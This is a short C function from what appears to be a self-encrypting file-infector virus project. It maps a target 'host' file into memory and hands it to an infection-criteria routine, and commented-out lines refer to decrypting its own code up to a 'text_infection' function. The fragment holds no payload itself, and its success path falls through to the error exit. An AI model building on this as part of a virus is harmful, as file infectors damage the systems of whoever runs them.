#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void host_constructor(struct s_host *host, struct s_keychain *keychain, const char *filename)
{
	int fd;
	struct stat statbuf;

	if ((fd = open(filename, O_RDONLY, 0000)) < 0)
		goto label_error;
	if (stat(filename, &statbuf) < 0)
		goto label_error;
	if ((host->header = mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
		goto label_error;

	host->filename = filename;
	host->filesize = statbuf.st_size;

	close(fd);

//	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
//	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);

	criteria(host, keychain);

label_error:
	printf("error\n");
	exit(1);
}
